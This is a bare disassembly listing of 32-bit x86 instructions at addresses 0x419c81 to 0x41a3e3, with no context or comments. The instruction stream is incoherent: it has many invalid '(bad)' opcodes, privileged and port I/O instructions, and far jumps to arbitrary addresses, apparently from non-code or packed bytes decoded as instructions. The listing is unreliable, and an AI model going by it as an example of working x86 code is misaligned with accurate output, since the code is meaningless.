  419c81:	call   FWORD PTR [esi-0x51]
  419c84:	or     esi,DWORD PTR [ebx+0x6015a1b3]
  419c8a:	xlat   BYTE PTR ds:[ebx]
  419c8b:	pop    eax
  419c8c:	sbb    DWORD PTR [ecx+0x372e3c43],0x403dd324
  419c96:	fsubr  DWORD PTR [edi+0x352cfb55]
  419c9c:	bound  edx,QWORD PTR [esi+0x6e766861]
  419ca2:	aam    0x20
  419ca4:	je     0x419cd8
  419ca6:	sub    eax,0x72264401
  419cab:	pop    ebp
  419cac:	loop   0x419c33
  419cae:	or     BYTE PTR [ecx+0x7d],dl
  419cb1:	int    0xe
  419cb3:	mov    al,0x42
  419cb5:	retf   0xbf0c
  419cb8:	add    al,0x4a
  419cba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cbb:	lods   eax,DWORD PTR ds:[esi]
  419cbc:	pushf  
  419cbd:	xchg   edi,ebp
  419cbf:	push   es
  419cc0:	jb     0x419c53
  419cc2:	adc    al,0xc6
  419cc4:	sub    ecx,DWORD PTR [ecx+ebx*8-0x33]
  419cc8:	inc    ecx
  419cc9:	xchg   BYTE PTR [edi+esi*4+0x7d],cl
  419ccd:	xchg   esp,eax
  419cce:	jae    0x419ced
  419cd0:	mov    ds:0x356c40f1,al
  419cd5:	sbb    DWORD PTR [ebx],edx
  419cd7:	rcr    bh,cl
  419cd9:	push   0x2c3bab19
  419cde:	inc    esi
  419cdf:	push   0x20
  419ce1:	stos   BYTE PTR es:[edi],al
  419ce2:	sti    
  419ce3:	fld    TBYTE PTR [edi-0x3939207c]
  419ce9:	jge    0x419d54
  419ceb:	or     DWORD PTR [eax-0x490b3402],ebx
  419cf1:	xor    eax,0x2d882751
  419cf6:	push   es
  419cf7:	mov    esp,0xebf378f6
  419cfc:	rol    BYTE PTR [ecx],cl
  419cfe:	stos   DWORD PTR es:[edi],eax
  419cff:	and    eax,0x6f2282b4
  419d04:	cmp    al,0x9e
  419d06:	mov    cl,0x6
  419d08:	shl    DWORD PTR [edx],1
  419d0a:	cwde   
  419d0b:	cdq    
  419d0c:	(bad)  
  419d0d:	and    DWORD PTR [eax],esp
  419d0f:	imul   ebx,DWORD PTR [edi-0x69],0x238921a2
  419d16:	popf   
  419d17:	mov    cs,ecx
  419d19:	adc    DWORD PTR [ebp-0x5fbcfabd],esp
  419d1f:	jno    0x419ccd
  419d21:	mov    cl,0xa9
  419d23:	cmp    ecx,DWORD PTR [edx+0x2]
  419d26:	fldcw  WORD PTR [edx+0x14]
  419d29:	dec    esp
  419d2a:	mov    dh,0xd5
  419d2c:	aaa    
  419d2d:	pusha  
  419d2e:	mov    dh,0x65
  419d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d31:	popa   
  419d32:	clc    
  419d33:	shl    ebp,1
  419d35:	std    
  419d36:	sub    dh,bl
  419d38:	mov    edi,0x2dee8c25
  419d3d:	aad    0xc6
  419d3f:	add    BYTE PTR ds:0xfa143cac,ah
  419d45:	cmp    edx,DWORD PTR [edi+0x15202c22]
  419d4b:	pop    es
  419d4c:	jecxz  0x419d16
  419d4e:	ret    0x5afa
  419d51:	ret    
  419d52:	add    DWORD PTR [esi+0x4b],ebx
  419d55:	sbb    cl,BYTE PTR [edi]
  419d57:	fild   WORD PTR [eax]
  419d59:	adc    cl,BYTE PTR ds:0x4e8a441a
  419d5f:	rol    ebp,0x8c
  419d62:	daa    
  419d63:	mov    DWORD PTR [eax-0x66],ebp
  419d66:	jmp    0x419d8b
  419d68:	aam    0x90
  419d6a:	xchg   ecx,eax
  419d6b:	sbb    dh,BYTE PTR ds:0x482d081c
  419d71:	mov    fs,WORD PTR [ebx+0x6bcbbd1e]
  419d77:	inc    edx
  419d78:	sub    dh,dh
  419d7a:	hlt    
  419d7b:	and    BYTE PTR [edx-0x5cfe2d93],bh
  419d81:	sbb    ecx,ecx
  419d83:	ror    BYTE PTR ds:0xf6f19d5e,0x1
  419d8a:	add    BYTE PTR [ebx+eiz*1-0xf],dl
  419d8e:	cmp    BYTE PTR [ecx+eiz*8],0xca
  419d92:	jns    0x419dc5
  419d94:	mov    fs,WORD PTR [eax]
  419d96:	add    eax,DWORD PTR ss:[ebp-0x46]
  419d9a:	dec    edi
  419d9b:	rcr    esp,cl
  419d9d:	pushf  
  419d9e:	inc    edi
  419d9f:	pop    ds
  419da0:	dec    eax
  419da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419da3:	js     0x419d7c
  419da5:	push   ss
  419da6:	sub    DWORD PTR [ecx-0x14],ecx
  419da9:	jb     0x419d4e
  419dab:	pop    esi
  419dac:	push   cs
  419dad:	pop    ecx
  419dae:	push   ds
  419daf:	xlat   BYTE PTR ds:[ebx]
  419db0:	iret   
  419db1:	lahf   
  419db2:	xchg   BYTE PTR [edx],ah
  419db4:	fsubp  st(2),st
  419db6:	enter  0xd26f,0x91
  419dba:	cmp    cl,BYTE PTR [esi-0x6c28e718]
  419dc0:	cmp    eax,0xf6d85e39
  419dc5:	add    cl,BYTE PTR [esi-0x23]
  419dc8:	ja     0x419d99
  419dca:	pop    ebx
  419dcb:	fidivr DWORD PTR [edx]
  419dcd:	mov    eax,0x2797debf
  419dd2:	clc    
  419dd3:	jnp    0x419def
  419dd5:	jno    0x419dad
  419dd7:	(bad)  
  419dd8:	or     edi,DWORD PTR [esi]
  419dda:	test   eax,0x38c1d33a
  419ddf:	xchg   ebx,eax
  419de0:	pminsw mm0,QWORD PTR [ebp+esi*2+0x3c435add]
  419de8:	mov    ch,0x2a
  419dea:	inc    eax
  419deb:	loop   0x419db2
  419ded:	or     eax,0xbd3871bc
  419df2:	push   cs
  419df3:	sar    DWORD PTR [ecx],0x72
  419df6:	xchg   edx,eax
  419df7:	xchg   edx,eax
  419df8:	sub    bl,bh
  419dfa:	jne    0x419e14
  419dfc:	das    
  419dfd:	int3   
  419dfe:	call   0x2b17:0xc5e37b93
  419e05:	das    
  419e06:	jg     0x419e71
  419e08:	aam    0x53
  419e0a:	add    eax,0x6eb57c74
  419e0f:	and    eax,0x14bd0449
  419e14:	xor    BYTE PTR [eax],bl
  419e16:	fsubr  QWORD PTR [ecx]
  419e18:	rol    edi,1
  419e1a:	jmp    0xf6bd7615
  419e1f:	test   al,0xdd
  419e21:	jb     0x419e1b
  419e23:	loopne 0x419e0b
  419e25:	push   eax
  419e26:	pop    ecx
  419e27:	sbb    DWORD PTR [ebp-0x6b5f2c53],edx
  419e2d:	test   al,0x9b
  419e2f:	push   ss
  419e30:	rcr    DWORD PTR [esi],0x6c
  419e33:	out    0xe,al
  419e35:	int3   
  419e36:	fistp  QWORD PTR [esi-0x245cb569]
  419e3c:	aam    0x43
  419e3e:	out    dx,eax
  419e3f:	pop    esi
  419e40:	loopne 0x419dfc
  419e42:	lods   al,BYTE PTR ds:[esi]
  419e43:	push   DWORD PTR [edi-0x6904c1c1]
  419e49:	mov    eax,ds:0xa19bd5b6
  419e4e:	push   ebx
  419e4f:	pop    ebp
  419e50:	scas   al,BYTE PTR es:[edi]
  419e51:	call   DWORD PTR [eax]
  419e53:	xchg   DWORD PTR [ecx],edi
  419e55:	outs   dx,DWORD PTR ds:[esi]
  419e56:	fucomip st,st(2)
  419e58:	icebp  
  419e59:	stc    
  419e5a:	sub    eax,0xaa855fbc
  419e5f:	jbe    0x419ed1
  419e61:	fs out dx,eax
  419e63:	(bad)  
  419e64:	push   eax
  419e65:	retf   
  419e66:	or     eax,0x693d2730
  419e6b:	or     edx,DWORD PTR [edx-0x55]
  419e6e:	mov    dh,0x7
  419e70:	push   ds
  419e71:	jb     0x419e6b
  419e73:	es sub bl,al
  419e76:	dec    ecx
  419e77:	cwde   
  419e78:	sub    esp,DWORD PTR [edi-0x4b173a69]
  419e7e:	sub    BYTE PTR [edx+0x77],dh
  419e81:	ror    DWORD PTR [eax+eiz*4+0x6b5c4f29],cl
  419e88:	add    eax,0xb7e1f18
  419e8d:	repnz inc esi
  419e8f:	push   es
  419e90:	mov    eax,ds:0x149aca6
  419e95:	push   edi
  419e96:	(bad)  
  419e97:	adc    eax,0xbe91f2d
  419e9c:	addr16 out 0x38,al
  419e9f:	sti    
  419ea0:	nop
  419ea1:	sub    al,0x4c
  419ea3:	or     eax,ebp
  419ea5:	jge    0x419e5d
  419ea7:	jg     0x419e95
  419ea9:	jecxz  0x419ed2
  419eab:	cli    
  419eac:	arpl   si,bx
  419eae:	les    edx,FWORD PTR [esi]
  419eb0:	sub    DWORD PTR [ebp+0x5e],ecx
  419eb3:	fsubr  DWORD PTR [ebx]
  419eb5:	inc    esp
  419eb6:	or     al,0xb7
  419eb8:	push   ecx
  419eb9:	lds    edi,FWORD PTR [edx-0xe]
  419ebc:	rcl    BYTE PTR [eax-0x6a62c83e],cl
  419ec2:	xchg   ebx,eax
  419ec3:	pop    ss
  419ec4:	loope  0x419f13
  419ec6:	mov    ds:0x54f77872,eax
  419ecb:	xchg   esp,eax
  419ecc:	je     0x419e53
  419ece:	sub    BYTE PTR [ecx],0x77
  419ed1:	stc    
  419ed2:	in     al,0xc4
  419ed4:	(bad)  
  419ed5:	imul   ebx,DWORD PTR [edx],0x4f86fe16
  419edb:	ss push 0xd6eb2c4e
  419ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ee2:	mov    dh,0x47
  419ee4:	jne    0x419ee1
  419ee6:	push   esp
  419ee7:	dec    esi
  419ee8:	xchg   esi,ebx
  419eea:	xor    ebp,DWORD PTR [ecx-0x20]
  419eed:	xor    al,BYTE PTR [edx]
  419eef:	sub    dh,BYTE PTR [edx+0x2d]
  419ef2:	pushf  
  419ef3:	(bad)  
  419ef4:	test   al,0x7c
  419ef6:	fs sti 
  419ef8:	and    edx,DWORD PTR ds:0xc8271b1b
  419efe:	inc    ebx
  419eff:	push   ebx
  419f00:	xor    al,0xc0
  419f02:	pop    esp
  419f03:	pop    ds
  419f04:	inc    ebp
  419f05:	shl    BYTE PTR [ebp-0x161c2ea7],cl
  419f0b:	xchg   esi,eax
  419f0c:	pop    esi
  419f0d:	aas    
  419f0e:	sar    BYTE PTR [edi-0x64],cl
  419f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f13:	push   cs
  419f14:	inc    esi
  419f15:	mov    bh,0xb0
  419f17:	adc    dl,dl
  419f19:	mov    esp,0xf53524
  419f1e:	inc    edi
  419f1f:	xchg   edx,eax
  419f20:	cmp    al,0xb8
  419f22:	xchg   edx,eax
  419f23:	inc    esi
  419f24:	mov    DWORD PTR [ecx+0xa6ecfa5],esi
  419f2a:	mov    ebx,0x949535f
  419f2f:	lods   eax,DWORD PTR ds:[esi]
  419f30:	sub    esp,DWORD PTR [ecx]
  419f32:	inc    ebp
  419f33:	in     al,0xd1
  419f35:	push   esp
  419f36:	xor    cl,0x39
  419f39:	push   edi
  419f3a:	inc    edx
  419f3b:	ja     0x419ef2
  419f3d:	push   cs
  419f3e:	pop    ebp
  419f3f:	daa    
  419f40:	ficom  DWORD PTR gs:[esi]
  419f43:	arpl   WORD PTR [ebp+0x2c159c63],ax
  419f49:	imul   ebx,eax,0xd26f534c
  419f4f:	sub    ebp,edi
  419f51:	loope  0x419f0c
  419f53:	lods   al,BYTE PTR ds:[esi]
  419f54:	pop    esp
  419f55:	cmc    
  419f56:	(bad)  
  419f57:	icebp  
  419f58:	cmc    
  419f59:	jmp    0x419f3c
  419f5b:	pop    edx
  419f5c:	rol    BYTE PTR [esi+0x43cb273f],1
  419f62:	es pop edx
  419f64:	addr16 jbe 0x419ef1
  419f67:	pop    eax
  419f68:	sbb    eax,DWORD PTR [eax-0x69]
  419f6b:	adc    eax,0xc02acb5f
  419f70:	dec    esi
  419f71:	sti    
  419f72:	jbe    0x419f8f
  419f74:	sbb    DWORD PTR [esp+esi*1],edx
  419f77:	pop    es
  419f78:	and    DWORD PTR [ebx],ebp
  419f7a:	jo     0x419fe5
  419f7c:	jne    0x419ff2
  419f7e:	ja     0x419f24
  419f80:	push   cs
  419f81:	lea    edx,[ebx]
  419f83:	adc    al,0x84
  419f85:	xchg   esp,eax
  419f86:	push   cs
  419f87:	xor    dh,BYTE PTR [ebx+0x3dc4f833]
  419f8d:	dec    ebp
  419f8e:	(bad)  
  419f8f:	mov    eax,0xaa0d6cbf
  419f94:	jbe    0x419fec
  419f96:	call   0xc9b8:0x5684ab0b
  419f9d:	jae    0x419f79
  419f9f:	push   esp
  419fa0:	sub    eax,0xd1e282de
  419fa5:	adc    ah,BYTE PTR [esi-0xc]
  419fa8:	fild   WORD PTR [eax]
  419faa:	jbe    0x41a016
  419fac:	jl     0x419fa5
  419fae:	mov    dl,0x6b
  419fb0:	mov    ecx,0x8374fa4f
  419fb5:	and    BYTE PTR [ebx+0x728e45ff],dh
  419fbb:	cmp    eax,0x80d594d4
  419fc0:	push   esi
  419fc1:	sbb    DWORD PTR [ebx],ecx
  419fc3:	cmp    DWORD PTR [ecx+0x1b61412c],edx
  419fc9:	mov    dl,0xb8
  419fcb:	add    al,ch
  419fcd:	and    al,0x4
  419fcf:	mov    edx,0x902b9a01
  419fd4:	lods   al,BYTE PTR ds:[esi]
  419fd5:	and    bl,BYTE PTR [ebp-0x1c6a4891]
  419fdb:	xor    esp,DWORD PTR [esi]
  419fdd:	dec    edi
  419fde:	popf   
  419fdf:	mov    bl,0xda
  419fe1:	mov    ebp,0x5a3cbac4
  419fe6:	mov    eax,ds:0xc87e1a22
  419feb:	call   0x8cf0c50d
  419ff0:	cmp    eax,0x2ab51cb
  419ff5:	fucomp st(3)
  419ff7:	mov    cl,0xff
  419ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ffa:	mov    DWORD PTR [eax-0x1509ec64],ebx
  41a000:	push   ebp
  41a001:	in     al,dx
  41a002:	loopne 0x41a034
  41a004:	mov    dl,0x41
  41a006:	ss sub bl,al
  41a009:	ins    DWORD PTR es:[edi],dx
  41a00a:	std    
  41a00b:	xor    esi,DWORD PTR [ebx]
  41a00d:	push   0xc
  41a00f:	cld    
  41a010:	pop    ebp
  41a011:	fcmovbe st,st(2)
  41a013:	jb     0x41a07a
  41a015:	shr    cl,cl
  41a017:	add    DWORD PTR [edi],0xffffff88
  41a01a:	popa   
  41a01b:	push   0xffffffe7
  41a01d:	jl     0x41a09d
  41a01f:	pop    ds
  41a020:	mov    bl,0x76
  41a022:	xchg   ebx,eax
  41a023:	mov    esp,0xb1c0b477
  41a028:	xchg   esp,eax
  41a029:	lds    edx,FWORD PTR [edi]
  41a02b:	jae    0x419fae
  41a02d:	shl    BYTE PTR [eax-0x673f8f90],1
  41a033:	imul   DWORD PTR [ecx]
  41a035:	pop    esi
  41a036:	jecxz  0x41a054
  41a038:	and    edx,edi
  41a03a:	or     DWORD PTR [edx+0x27c5e757],edi
  41a040:	ret    0x29b6
  41a043:	shl    ebp,cl
  41a045:	inc    esi
  41a046:	xor    ebp,DWORD PTR [eax]
  41a048:	push   0xffffffdb
  41a04a:	and    DWORD PTR [edi],ebx
  41a04c:	jmp    0x1dee56f5
  41a051:	pop    esi
  41a052:	sbb    al,BYTE PTR [edi+0x4]
  41a055:	xor    al,BYTE PTR [edi-0x50]
  41a058:	arpl   dx,ax
  41a05a:	shl    DWORD PTR [eax+0x115d5af0],0x12
  41a061:	sub    DWORD PTR [esi-0x45f9ea4c],ebp
  41a067:	scas   eax,DWORD PTR es:[edi]
  41a068:	inc    ecx
  41a069:	loope  0x41a099
  41a06b:	sub    ah,BYTE PTR [edi]
  41a06d:	shrd   DWORD PTR [esi],ecx,cl
  41a070:	cmp    esi,DWORD PTR [edi]
  41a072:	dec    eax
  41a073:	test   DWORD PTR [eax+edi*4-0x4c401627],edi
  41a07a:	add    eax,0x6dd52a87
  41a07f:	(bad)  
  41a080:	out    dx,eax
  41a081:	into   
  41a082:	fnstsw WORD PTR [esi+0xb]
  41a085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a086:	mov    cl,0x44
  41a088:	ins    DWORD PTR es:[edi],dx
  41a089:	outs   dx,DWORD PTR ds:[esi]
  41a08a:	sub    esi,ebx
  41a08c:	imul   esp,DWORD PTR ds:0xb260ea62,0x24
  41a093:	(bad)  
  41a095:	inc    ebp
  41a096:	sub    DWORD PTR [ecx+0x2a],esi
  41a099:	sbb    esp,esp
  41a09b:	ins    BYTE PTR es:[edi],dx
  41a09c:	xor    DWORD PTR ss:[eax+0x46],edx
  41a0a0:	pop    es
  41a0a1:	push   ss
  41a0a2:	pop    ds
  41a0a3:	lock repz test eax,0x78e8496b
  41a0aa:	clc    
  41a0ab:	xlat   BYTE PTR ds:[ebx]
  41a0ac:	jnp    0x41a0d5
  41a0ae:	adc    dl,dl
  41a0b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0b1:	in     eax,dx
  41a0b2:	clc    
  41a0b3:	out    0x3f,al
  41a0b5:	lods   eax,DWORD PTR ds:[esi]
  41a0b6:	push   cs
  41a0b7:	(bad)  
  41a0b8:	xor    esi,DWORD PTR [ecx-0x37]
  41a0bb:	loopne 0x41a041
  41a0bd:	icebp  
  41a0be:	sub    BYTE PTR [ebp+0x7b249362],ah
  41a0c4:	adc    BYTE PTR [ecx+eax*8],bl
  41a0c7:	mov    ds:0x6ae69bb7,al
  41a0cc:	mov    BYTE PTR [ebx-0x38],bl
  41a0cf:	jle    0x41a14c
  41a0d1:	and    edx,DWORD PTR [ecx+0x269bb06c]
  41a0d7:	mov    esi,0xa3416967
  41a0dc:	inc    edi
  41a0dd:	(bad)  
  41a0de:	iret   
  41a0df:	not    DWORD PTR [eax]
  41a0e1:	push   edi
  41a0e2:	outs   dx,BYTE PTR ds:[esi]
  41a0e3:	leave  
  41a0e4:	hlt    
  41a0e5:	data16 fcmovb st,st(2)
  41a0e8:	dec    ecx
  41a0e9:	nop
  41a0ea:	lock dec edi
  41a0ec:	inc    esp
  41a0ed:	push   eax
  41a0ee:	(bad)  
  41a0ef:	xor    DWORD PTR [eax-0x74],edi
  41a0f2:	mov    bl,0xc3
  41a0f4:	mov    eax,ds:0xf6bcf7a4
  41a0f9:	cld    
  41a0fa:	sbb    BYTE PTR [edi],ah
  41a0fc:	add    BYTE PTR [eax+ecx*2+0x55],ch
  41a100:	call   0xac33bd0e
  41a105:	or     BYTE PTR [eax*8+0x461781bc],ah
  41a10c:	fmul   QWORD PTR [ecx]
  41a10e:	cdq    
  41a10f:	mov    cl,0x2d
  41a111:	inc    ecx
  41a112:	ins    BYTE PTR es:[edi],dx
  41a113:	enter  0xd3bc,0xb1
  41a117:	loope  0x41a0df
  41a119:	sbb    edi,DWORD PTR [esi-0x11]
  41a11c:	xchg   BYTE PTR [edi],cl
  41a11e:	or     eax,0x82bcee43
  41a123:	or     edi,ebp
  41a125:	out    dx,al
  41a126:	add    ah,BYTE PTR [edx-0x3e]
  41a129:	(bad)
  41a12d:	pop    esp
  41a12e:	pop    eax
  41a12f:	add    eax,0x37c5c0b
  41a134:	es sti 
  41a136:	ss mov eax,0x26775784
  41a13c:	nop
  41a13d:	mov    cl,cl
  41a13f:	fwait
  41a140:	outs   dx,DWORD PTR ds:[esi]
  41a141:	and    eax,0x35a466ca
  41a146:	(bad)  
  41a148:	sbb    DWORD PTR [ebp-0x38],0x928b5027
  41a14f:	(bad)
  41a152:	adc    esp,DWORD PTR [edi-0x1531889a]
  41a158:	ret    
  41a159:	mov    DWORD PTR [eax+0x16],ebp
  41a15c:	sbb    eax,ebx
  41a15e:	jl     0x41a0ff
  41a160:	pop    esi
  41a161:	scas   eax,DWORD PTR es:[edi]
  41a162:	leave  
  41a163:	jg     0x41a183
  41a165:	add    edi,DWORD PTR [ecx]
  41a167:	xor    dh,BYTE PTR [ebp+0x11]
  41a16a:	test   BYTE PTR [ebx-0x16a9c975],bh
  41a170:	jo     0x41a15a
  41a172:	std    
  41a173:	push   ebp
  41a174:	ficom  DWORD PTR [edx+0x3f]
  41a177:	push   0x43e993b2
  41a17c:	jle    0x41a125
  41a17e:	jecxz  0x41a18a
  41a180:	call   0x287004fa
  41a185:	rcr    DWORD PTR [edx+0x27f76812],cl
  41a18b:	pop    DWORD PTR [ecx-0x2e41fec0]
  41a191:	or     DWORD PTR [edx+0x3b],eax
  41a194:	ja     0x41a128
  41a196:	clc    
  41a197:	das    
  41a198:	mov    al,0x84
  41a19a:	mov    ecx,0xef245af8
  41a19f:	add    eax,0x1a36c654
  41a1a4:	xor    eax,DWORD PTR [edx]
  41a1a6:	(bad)  
  41a1a7:	call   0xb676:0x287f0a2f
  41a1ae:	clc    
  41a1af:	ret    0x2f83
  41a1b2:	sub    BYTE PTR [esi],cl
  41a1b4:	cli    
  41a1b5:	xor    DWORD PTR [esi+ecx*1+0xf6974d6],edi
  41a1bc:	mov    eax,ds:0x7537045f
  41a1c1:	jl     0x41a224
  41a1c3:	jp     0x41a150
  41a1c5:	push   edi
  41a1c6:	(bad)  
  41a1c7:	fst    QWORD PTR [ebx+0x20]
  41a1ca:	xor    eax,0xfb044bc1
  41a1cf:	aas    
  41a1d0:	loopne 0x41a192
  41a1d2:	push   esp
  41a1d3:	sub    al,0x29
  41a1d5:	arpl   WORD PTR [ebp+0x236f9072],si
  41a1db:	pusha  
  41a1dc:	xchg   esi,eax
  41a1dd:	call   0xf8c8b084
  41a1e2:	inc    ebp
  41a1e3:	adc    ah,BYTE PTR [eax+0x70]
  41a1e6:	sub    BYTE PTR [edi],bh
  41a1e8:	inc    ebx
  41a1e9:	ret    0x575b
  41a1ec:	ja     0x41a250
  41a1ee:	sbb    eax,0x8e7e0d49
  41a1f3:	imul   edx,ebp,0x57
  41a1f6:	sub    BYTE PTR [edx+0x6564b26b],cl
  41a1fc:	jecxz  0x41a273
  41a1fe:	call   0x8d25:0x787f3bcf
  41a205:	out    0x54,eax
  41a207:	pop    esp
  41a208:	fcomp  QWORD PTR [ecx+0x1]
  41a20b:	daa    
  41a20c:	mov    dl,0x42
  41a20e:	in     al,0xaf
  41a210:	xor    ecx,DWORD PTR [edx]
  41a212:	out    dx,eax
  41a213:	push   cs
  41a214:	dec    esp
  41a215:	int    0x4e
  41a217:	sbb    ebp,DWORD PTR [eax+0x6cc8b203]
  41a21d:	adc    eax,0x17d994e1
  41a222:	mov    bl,0x5
  41a224:	xlat   BYTE PTR ds:[ebx]
  41a226:	cmp    BYTE PTR [esp+ebx*4],al
  41a229:	xchg   DWORD PTR [ebx],esi
  41a22b:	ins    DWORD PTR es:[edi],dx
  41a22c:	rcl    BYTE PTR [ebx-0x377105d9],0xec
  41a233:	add    ch,BYTE PTR [edx-0x50]
  41a236:	mov    ?,WORD PTR [eax+0x6b6665e8]
  41a23c:	repz sbb al,0x38
  41a23f:	scas   eax,DWORD PTR es:[edi]
  41a240:	out    dx,eax
  41a241:	xchg   ebx,eax
  41a242:	adc    ebp,ebp
  41a244:	sub    dl,BYTE PTR [eax]
  41a246:	dec    esp
  41a247:	hlt    
  41a248:	mov    ah,0xfa
  41a24a:	shl    BYTE PTR [ebp-0x63],cl
  41a24d:	mov    WORD PTR [eax-0x11],ds
  41a250:	pop    esp
  41a251:	xor    al,0x39
  41a253:	lock and eax,ecx
  41a256:	(bad)  
  41a257:	pop    ebp
  41a258:	(bad)  
  41a259:	jp     0x41a2d6
  41a25b:	jns    0x41a2d7
  41a25d:	(bad)  
  41a25e:	pop    edi
  41a260:	imul   esi,DWORD PTR [ecx],0xffffffe8
  41a263:	sub    esi,DWORD PTR [ecx]
  41a265:	shl    BYTE PTR [eax-0x6c],1
  41a268:	inc    ebp
  41a269:	inc    edx
  41a26a:	or     BYTE PTR [eax-0xf],dl
  41a26d:	mov    bh,0x8c
  41a26f:	imul   esi,DWORD PTR [edi],0x29
  41a272:	pop    edi
  41a273:	(bad)  
  41a275:	xchg   ecx,eax
  41a276:	sbb    cl,BYTE PTR [eax+ebp*4+0x3fdd442d]
  41a27d:	test   eax,0x8948fce2
  41a282:	sbb    dl,bh
  41a284:	pop    esp
  41a285:	lds    esi,FWORD PTR [edi+0x50f4241a]
  41a28b:	enter  0xdb5e,0x5b
  41a28f:	fcmovnb st,st(0)
  41a291:	jb     0x41a22b
  41a293:	std    
  41a294:	pop    ebp
  41a295:	xchg   edx,eax
  41a296:	mov    ebx,0x5f4427e3
  41a29b:	sahf   
  41a29c:	dec    esp
  41a29d:	jmp    0x41a259
  41a29f:	mov    bh,dl
  41a2a1:	add    eax,0x2d613973
  41a2a6:	(bad)  
  41a2a7:	push   ss
  41a2a8:	pop    ds
  41a2a9:	mov    esp,0x7ac9c0d
  41a2ae:	pop    ebp
  41a2af:	push   esi
  41a2b0:	or     al,0xdc
  41a2b2:	jmp    0x98c1:0xf505ee73
  41a2b9:	pushf  
  41a2ba:	add    bl,BYTE PTR [ecx]
  41a2bc:	int3   
  41a2bd:	cwde   
  41a2be:	stos   DWORD PTR es:[edi],eax
  41a2bf:	or     eax,0xdd9ed5d8
  41a2c4:	loopne 0x41a247
  41a2c6:	(bad)  
  41a2c8:	into   
  41a2c9:	js     0x41a280
  41a2cb:	imul   ch
  41a2cd:	inc    ecx
  41a2ce:	xchg   edx,eax
  41a2cf:	fdivr  st(0),st
  41a2d1:	pop    edi
  41a2d2:	outs   dx,BYTE PTR ds:[esi]
  41a2d3:	pop    ecx
  41a2d4:	lods   eax,DWORD PTR ds:[esi]
  41a2d5:	xlat   BYTE PTR ds:[ebx]
  41a2d6:	mov    ecx,edx
  41a2d8:	sbb    al,0x7b
  41a2da:	pushf  
  41a2db:	pop    ds
  41a2dc:	xchg   DWORD PTR [esi],edi
  41a2de:	arpl   WORD PTR ds:0x316636c7,ax
  41a2e4:	mov    al,0xfd
  41a2e6:	les    eax,FWORD PTR [edx+0x3f]
  41a2e9:	pusha  
  41a2ea:	push   ecx
  41a2eb:	cld    
  41a2ec:	jmp    0x50ed:0x7de88d52
  41a2f3:	pop    es
  41a2f4:	xchg   edx,eax
  41a2f5:	or     al,BYTE PTR [eax+0x4a]
  41a2f8:	mov    ah,0xed
  41a2fa:	and    eax,0x33d288de
  41a2ff:	adc    cl,BYTE PTR [esi]
  41a301:	jmp    0x41a316
  41a303:	mov    cs,ebx
  41a305:	push   ss
  41a306:	stos   DWORD PTR es:[edi],eax
  41a307:	add    DWORD PTR [esi+edi*2+0x5e0ba73c],ebp
  41a30e:	in     eax,0x8b
  41a310:	add    DWORD PTR [ecx],esp
  41a312:	fsub   DWORD PTR [edi-0xf00014d]
  41a318:	scas   al,BYTE PTR es:[edi]
  41a319:	repz dec ebp
  41a31b:	fdivr  DWORD PTR [edi]
  41a31d:	xchg   edi,eax
  41a31e:	outs   dx,BYTE PTR ds:[esi]
  41a31f:	lds    esp,FWORD PTR [edx+edi*8-0x588a1cde]
  41a326:	push   esi
  41a327:	inc    ecx
  41a328:	shr    DWORD PTR [ebx-0x72],0x7c
  41a32c:	in     eax,0x4b
  41a32e:	bound  esp,QWORD PTR ds:0xe8fb4c42
  41a334:	push   esp
  41a335:	sbb    dl,BYTE PTR [edi]
  41a337:	adc    BYTE PTR [eax],bh
  41a339:	jmp    FWORD PTR [esi+0x235b3a7c]
  41a33f:	jg     0x41a3af
  41a341:	in     eax,0x75
  41a343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a344:	inc    ebp
  41a345:	test   BYTE PTR [edi-0x7a],al
  41a348:	int3   
  41a349:	push   0x7c463311
  41a34e:	aaa    
  41a34f:	fsubr  QWORD PTR [ecx+0x1e55965a]
  41a355:	fcomp  DWORD PTR [ecx-0x39ace605]
  41a35b:	dec    edx
  41a35c:	mov    ds:0x14d44338,eax
  41a361:	add    eax,0xa3706c97
  41a366:	pop    DWORD PTR [ecx]
  41a368:	and    ebx,DWORD PTR [ebx+eiz*1]
  41a36b:	and    DWORD PTR [eax-0x11],esi
  41a36e:	add    eax,0xb78091ac
  41a373:	mov    dh,0x48
  41a375:	inc    esp
  41a376:	hlt    
  41a377:	dec    eax
  41a378:	adc    edx,DWORD PTR [ebx]
  41a37a:	mov    esp,0x6b4e54f2
  41a37f:	fsub   QWORD PTR [esi-0x5881825d]
  41a385:	cmp    DWORD PTR [edx],ecx
  41a387:	pop    ecx
  41a388:	jne    0x41a3fc
  41a38a:	int    0x54
  41a38c:	mov    BYTE PTR [ecx-0x41],0x8c
  41a390:	in     al,0xa8
  41a392:	pop    ds
  41a393:	sbb    edx,DWORD PTR [ebp+0x66]
  41a396:	sbb    edi,esp
  41a398:	fistp  QWORD PTR [ebx]
  41a39a:	xchg   esi,eax
  41a39b:	shl    BYTE PTR [ecx+0x7d503499],cl
  41a3a1:	or     dh,BYTE PTR [ebx+0x39]
  41a3a4:	mov    esi,0x17d832fb
  41a3a9:	dec    ecx
  41a3aa:	add    al,BYTE PTR [ebx]
  41a3ac:	call   FWORD PTR [esi+0x34a455d8]
  41a3b2:	mov    cl,0x68
  41a3b4:	ds jmp 0xe67e7cd4
  41a3ba:	lods   eax,DWORD PTR ds:[esi]
  41a3bb:	lods   eax,DWORD PTR ds:[esi]
  41a3bc:	or     DWORD PTR ss:[ebx-0x704d1d10],0xfffffff0
  41a3c4:	xchg   BYTE PTR [edx-0x7d00ec5f],bh
  41a3ca:	ds leave 
  41a3cc:	lods   eax,DWORD PTR ds:[esi]
  41a3cd:	(bad)  
  41a3ce:	call   0x3333aca1
  41a3d3:	jl     0x41a36c
  41a3d5:	jnp    0x41a412
  41a3d7:	mov    bh,0x3b
  41a3d9:	jl     0x41a3c9
  41a3db:	js     0x41a444
  41a3dd:	mov    ah,0x90
  41a3df:	add    esp,eax
  41a3e1:	xlat   BYTE PTR ds:[ebx]
  41a3e2:	stos   DWORD PTR es:[edi],eax
  41a3e3:	clc    
